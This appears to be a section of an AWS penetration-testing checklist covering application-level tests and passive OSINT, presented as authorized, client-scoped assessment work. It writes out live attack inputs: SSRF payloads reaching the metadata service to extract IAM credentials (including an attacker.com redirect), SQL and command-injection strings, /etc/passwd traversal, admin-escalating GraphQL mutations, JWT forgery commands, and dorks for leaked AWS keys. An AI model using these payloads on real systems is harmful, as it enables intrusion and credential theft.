Repeatability: per_asset
Prerequisites: Unauthenticated for OSINT procedures; application in scope for app-level tests
Description: Supplementary checks that overlap with web application penetration testing or passive OSINT reconnaissance. These items are questionable fit for a pure AWS infrastructure pentest and should only be included if explicitly agreed with the client. Application-level tests require the web application to be in scope; OSINT procedures are useful for pre-engagement context gathering.
Tags: ssrf, imds, graphql, appsync, api-injection, cognito-jwt, osint, shodan, censys, pastebin, wayback, account-id
Potential Severity: high

===========================================
REVIEW-1 | Application-Level Tests
===========================================
> NOTE: These checks overlap with standard web application penetration testing.
> Include ONLY if the hosted application is explicitly in scope AND the relevant
> infrastructure (EC2/ECS/Lambda with IMDS, AppSync, API Gateway) is reachable.

------------------------------------------
Procedure 0 — Test for SSRF Targeting IMDS
Tools: Burp Suite, curl, ffuf
Intrusiveness: medium
Description: Test public-facing applications hosted on EC2/ECS/Lambda for Server-Side Request Forgery (SSRF) vulnerabilities that could reach the EC2 Instance Metadata Service (IMDS) at 169.254.169.254, potentially leaking IAM role credentials.
> NOTE: SSRF is an application vulnerability. Include only if the application is in scope AND hosted on EC2/ECS/Lambda where IMDS is reachable.

Step 1: Identify input parameters that accept URLs or perform server-side requests:
  - URL parameters: ?url=, ?redirect=, ?page=, ?load=, ?fetch=, ?proxy=
  - File upload with URL fetch capability
  - Webhook configuration endpoints
  - PDF/image generation from URLs

Step 2: Test IMDSv1 SSRF payloads:
  # Direct:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  # IP encoding bypasses:
  http://2852039166/latest/meta-data/  # Decimal
  http://0xA9FEA9FE/latest/meta-data/  # Hex
  http://0251.0376.0251.0376/latest/meta-data/  # Octal
  http://[::ffff:169.254.169.254]/latest/meta-data/  # IPv6
  # DNS rebinding:
  http://169.254.169.254.nip.io/latest/meta-data/
  # Redirect-based:
  http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

Step 3: Test IMDSv2 SSRF (requires PUT with header — harder to exploit):
  # IMDSv2 requires a token obtained via PUT request with X-aws-ec2-metadata-token-ttl-seconds header
  # Most SSRF vulnerabilities cannot set custom headers → IMDSv2 mitigates basic SSRF
  # Test if IMDSv1 is still available (hop limit and HttpTokens setting)

Step 4: If IMDS is reachable, extract credentials:
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

Step 5: Validate extracted credentials:
  aws sts get-caller-identity

Flag: SSRF vulnerability allows reaching IMDS and extracting IAM role credentials, or IMDSv1 is enabled on instances running internet-facing applications.

------------------------------------------
Procedure 1 — Test GraphQL (AppSync) for Introspection and Unauthenticated Queries
Tools: Burp Suite, curl, graphql-voyager, InQL
Intrusiveness: medium
Description: Test AWS AppSync GraphQL endpoints for introspection disclosure and unauthenticated query execution.
> NOTE: Introspection testing is app-level. Relevant only if AppSync application logic is in scope.

Step 1: Identify AppSync endpoints:
  aws appsync list-graphql-apis --query 'graphqlApis[*].[name,uris,authenticationType]' --output table

Step 2: Test introspection query:
  curl -s -X POST <appsync-endpoint> \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

Step 3: If introspection succeeds, map the full schema:
  # Use InQL Burp extension or graphql-voyager for visualization
  # Download full schema:
  curl -s -X POST <appsync-endpoint> \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { name type { ...TypeRef } } type { ...TypeRef } } } fragment TypeRef on __Type { kind name ofType { kind name } }"}'

Step 4: Test unauthenticated queries for sensitive data:
  # Based on discovered schema, attempt queries without authentication
  curl -s -X POST <appsync-endpoint> \
    -H "Content-Type: application/json" \
    -d '{"query":"{ listUsers { items { id email role } } }"}'

Step 5: Test mutations for unauthorized modifications:
  curl -s -X POST <appsync-endpoint> \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { updateUser(input: { id: \"1\", role: \"admin\" }) { id role } }"}'

Flag: GraphQL introspection is enabled exposing the full schema, or unauthenticated queries return sensitive data.

------------------------------------------
Procedure 2 — Test API Gateway Routes for Injection
Tools: Burp Suite, sqlmap, ffuf
Intrusiveness: medium
Description: Test API Gateway routes for injection vulnerabilities including SQL injection, command injection, and IDOR (Insecure Direct Object Reference).
> NOTE: Application-level testing. Requires separate agreement or explicit scope inclusion.

Step 1: Map all API Gateway routes:
  aws apigateway get-rest-apis
  for api in $(aws apigateway get-rest-apis --query 'items[*].id' --output text); do
    aws apigateway get-resources --rest-api-id "$api" --query 'items[*].[path,resourceMethods]' --output table
  done

Step 2: Test for SQL injection:
  # Parameter-based:
  curl "<api-url>/resource?id=1' OR '1'='1"
  curl "<api-url>/resource?id=1 UNION SELECT 1,2,3--"
  # Using sqlmap:
  sqlmap -u "<api-url>/resource?id=1" --batch --level=3

Step 3: Test for command injection:
  curl "<api-url>/resource" -d '{"input": "; id"}'
  curl "<api-url>/resource" -d '{"input": "$(whoami)"}'
  curl "<api-url>/resource" -d '{"input": "`id`"}'

Step 4: Test for IDOR:
  # Enumerate object IDs:
  curl "<api-url>/users/1"
  curl "<api-url>/users/2"
  # Test with different authenticated user's token accessing another user's data

Step 5: Test for path traversal:
  curl "<api-url>/files/../../etc/passwd"
  curl "<api-url>/files/..%2F..%2Fetc%2Fpasswd"

Flag: API Gateway routes are vulnerable to injection attacks (SQLi, command injection) or IDOR allows unauthorized data access.

------------------------------------------
Procedure 3 — Test Cognito JWT Algorithm Confusion
Tools: jwt_tool, Burp Suite, Python/PyJWT
Intrusiveness: medium
Description: Test Cognito-issued JWT tokens for algorithm confusion attacks (RS256 to HS256), where the public key is used as the HMAC secret to forge tokens.
> NOTE: Application-level auth attack. Include if Cognito + consuming application is in scope.

Step 1: Obtain a valid JWT token from the application:
  # Login via Cognito and capture the id_token/access_token

Step 2: Decode the token and identify the algorithm:
  jwt_tool <token>
  # Check header: {"alg":"RS256","kid":"..."}

Step 3: Obtain the Cognito public key:
  curl -s "https://cognito-idp.<region>.amazonaws.com/<user-pool-id>/.well-known/jwks.json"
  # Extract the RSA public key

Step 4: Attempt algorithm confusion (RS256 → HS256):
  # Convert JWKS to PEM format
  # Use the public key as HMAC secret to sign a new token
  jwt_tool <token> -X k -pk public_key.pem
  # Or with Python:
  # import jwt
  # forged = jwt.encode({"sub":"admin","custom:role":"admin"}, public_key, algorithm="HS256")

Step 5: Submit the forged token to the application and check if it's accepted:
  curl -H "Authorization: Bearer <forged-token>" "<api-url>/admin/endpoint"

Step 6: Test other JWT attacks:
  jwt_tool <token> -X a  # Algorithm none attack
  jwt_tool <token> -X n  # Null signature

Flag: Application accepts JWT tokens signed with HS256 using the public RS256 key, allowing token forgery, or accepts tokens with "none" algorithm.

===========================================
REVIEW-2 | Passive OSINT (Pre-Engagement)
===========================================
> NOTE: These are passive reconnaissance techniques useful for pre-engagement
> context but may be out of scope for authenticated-only engagements. Confirm
> with the client before including.

------------------------------------------
Procedure 4 — Search Shodan / Censys for AWS-Hosted IPs and Open Ports
Tools: Shodan, Censys, nmap
Intrusiveness: passive
Description: Search internet-wide scan databases for AWS-hosted assets belonging to the target, identifying exposed services and open ports.
> NOTE: Useful for initial context but may be out of scope for authenticated-only engagements.

Step 1: Identify target's AWS IP ranges:
  # From DNS enumeration:
  dig +short <target-domain> | head -5
  # Check if IPs are in AWS ranges:
  curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq '.prefixes[] | select(.ip_prefix | startswith("X.X."))'

Step 2: Search Shodan:
  shodan search "org:<target-organization>"
  shodan search "ssl.cert.subject.cn:<target-domain>"
  shodan search "net:<target-ip-range>"
  shodan host <target-ip>

Step 3: Search Censys:
  # Use Censys search API or web interface
  # Search by certificate, organization, or IP range

Step 4: Document findings:
  - Exposed services and ports
  - Software versions (for vulnerability matching)
  - SSL/TLS certificate details
  - Geographic distribution

Flag: Shodan/Censys reveals exposed services on non-standard ports, outdated software versions, or sensitive services (databases, admin panels) accessible from the internet.

------------------------------------------
Procedure 5 — Search Pastebin / StackOverflow / Gists for Leaked Credentials
Tools: Google dorks, Pastebin search, GitHub Gist search
Intrusiveness: passive
Description: Search public paste sites and developer forums for accidentally leaked AWS credentials, configuration snippets, and internal information belonging to the target.
> NOTE: Passive OSINT. May be a separate threat intel deliverable.

Step 1: Google dork searches:
  site:pastebin.com "<target-domain>" aws
  site:pastebin.com "AKIA" "<target-domain>"
  site:stackoverflow.com "<target-domain>" "aws_access_key"
  site:gist.github.com "<target-domain>" "secret"

Step 2: Search GitHub Gists:
  # GitHub search:
  "AKIA" "<target-org>" language:yaml
  "<target-domain>" "aws_secret_access_key"

Step 3: Search StackOverflow for configuration leaks:
  # Developers may post config snippets with credentials
  # Search for target domain, account IDs, or service names

Step 4: Validate any discovered credentials:
  aws sts get-caller-identity  # Using discovered keys

Flag: Credentials or sensitive configuration data belonging to the target are found on public paste/code sites.

------------------------------------------
Procedure 6 — Search Wayback Machine for Historical Exposed Endpoints
Tools: Wayback Machine (web.archive.org), waybackurls, gau
Intrusiveness: passive
Description: Search historical web archives for endpoints, API paths, and sensitive resources that may have been exposed in the past and could still be accessible.
> NOTE: Passive OSINT. Useful for discovering forgotten endpoints.

Step 1: Enumerate historical URLs:
  waybackurls <target-domain> | sort -u > wayback_urls.txt
  # Or using gau (GetAllUrls):
  gau <target-domain> | sort -u >> wayback_urls.txt

Step 2: Filter for interesting patterns:
  cat wayback_urls.txt | grep -iE '(api|admin|config|backup|swagger|graphql|\.env|\.json|\.xml|\.yml)'

Step 3: Test if historical endpoints are still accessible:
  cat wayback_urls.txt | httpx -mc 200 -title -tech-detect

Step 4: Check Wayback Machine for cached sensitive content:
  # Visit web.archive.org and search for:
  # - /robots.txt (reveals hidden paths)
  # - /swagger-ui/ or /api-docs/
  # - /.env or /config files
  # - Directory listings

Flag: Historical endpoints reveal currently accessible sensitive resources, forgotten API endpoints, or cached credentials/configuration.

------------------------------------------
Procedure 7 — Enumerate AWS Account ID via Public Error Messages
Tools: curl, aws cli, Burp Suite
Intrusiveness: passive
Description: Attempt to enumerate the target's AWS account ID through public error messages, response headers, and misconfigured resources.
> NOTE: Useful for scoping. Account ID knowledge enables targeted role enumeration and resource access.

Step 1: Check S3 bucket error messages:
  curl -s "https://<target-bucket>.s3.amazonaws.com/" 2>/dev/null
  # ListBucketResult or AccessDenied errors may reveal account info

Step 2: Check CloudFront error pages:
  # Custom error pages may leak internal information

Step 3: Try to enumerate account ID via IAM:
  # If you have any valid key, you can use the technique:
  aws sts get-access-key-info --access-key-id AKIA<key>

Step 4: Check for account ID in public resources:
  # AMI descriptions, snapshot descriptions, resource ARNs in error messages
  # API Gateway error responses may include account ID in stage ARN

Step 5: Use the STS assume-role enumeration technique:
  # Enumerate valid role names - different error for existing vs non-existing roles:
  aws sts assume-role --role-arn "arn:aws:iam::<guessed-account-id>:role/admin" --role-session-name test 2>&1

Flag: AWS account ID is discoverable through public error messages or resource metadata, enabling targeted attacks.

------------------------------------------
References:
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- https://portswigger.net/web-security/ssrf
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- https://docs.aws.amazon.com/appsync/latest/devguide/security-authz.html
- https://jwt.io/introduction
- https://github.com/ticarpi/jwt_tool
- https://www.shodan.io/
- https://search.censys.io/
- https://github.com/tomnomnom/waybackurls
- https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2.0/
